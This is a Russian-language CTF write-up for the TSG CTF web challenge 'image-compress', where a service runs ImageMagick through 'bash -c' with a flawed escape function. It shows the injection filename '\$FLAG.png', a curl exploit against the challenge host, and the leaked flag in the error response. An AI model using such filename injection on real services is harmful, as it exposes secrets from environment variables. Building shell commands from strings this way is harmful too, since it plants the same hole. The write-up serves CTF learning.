# TSG CTF — image-compress (райтап)

**Категория:** Web  
**Цель:** получить флаг через уязвимость в обработке имени файла при сжатии картинки.

## Флаг
`TSGCTF{d0llar_s1gn_1s_mag1c_1n_sh3ll_env1r0nm3nt}`

---

## Что делает сервис
Есть эндпоинт:

- `POST /compress`
  - `image` — файл (multipart/form-data)
  - `quality` — качество (число)

Сервис кладёт загруженную картинку во временную папку и вызывает ImageMagick (`magick`) для сжатия.

---

## Почему это уязвимо
В бэкенде команда формируется **строкой** и запускается через shell:

- используется `bash -c "<command>"`

Команда выглядит примерно так:

```bash
magick "${inputPath}" -quality ${quality} -strip "${outputPath}"
```

Где `inputPath`/`outputPath` зависят от **имени загруженного файла**.

Перед вставкой имени используется самописная функция `escape(...)`, которая экранирует много спецсимволов (включая `$`), но **не экранирует обратный слеш `\`**.

Из‑за этого можно «сломать» экранирование и заставить bash раскрыть переменную окружения `$FLAG` **внутри двойных кавычек**.

### Логика трюка с именем файла
Если загрузить файл с именем:

- `\$FLAG.png` (то есть **обратный слеш перед `$`**)

то после `escape(...)` получится последовательность вида:

- `\\$FLAG.png`

Дальше bash при разборе внутри двойных кавычек делает так:

- `\\` превращается в один литеральный `\`
- `$FLAG` остаётся **неэкранированным** и раскрывается в значение переменной окружения `FLAG`

В итоге `magick` пытается открыть путь, содержащий флаг, например:

```
./tmp/inputs/\TSGCTF{...}.png
```

Такого файла нет, ImageMagick печатает ошибку в `stderr`, а сервер возвращает эту ошибку в JSON — вместе с раскрытым флагом.

## Эксплуатация (получение флага)

### 1) Подготовь любую валидную PNG (если нет — создай 1×1)
```bash
python3 - <<'PY'
import base64
b = base64.b64decode("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMB/6X9xQAAAABJRU5ErkJggg==")
open("test.png","wb").write(b)
print("made test.png")
PY
```

### 2) Отправь запрос с «опасным» filename
Важно: нужно, чтобы на сервер ушло **именно** имя с `\$FLAG`, а твой локальный shell не раскрыл `$FLAG` у тебя.

Команда (рабочий вариант):

```bash
curl -i -v \
  -F "quality=85" \
  -F "image=@test.png;type=image/png;filename=\\\$FLAG.png" \
  http://35.221.67.248:10502/compress
```

### 3) Забери флаг из ответа
Сервис отвечает `500` и JSON, внутри которого будет ошибка ImageMagick с путём, где виден флаг, например:

```json
{
  "error": "Failed to compress image: Error: Shell command failed: \nmagick: unable to open image './tmp/inputs/\\TSGCTF{d0llar_s1gn_1s_mag1c_1n_sh3ll_env1r0nm3nt}.png': No such file or directory ...\n"
}
```

Флаг находится прямо внутри пути.
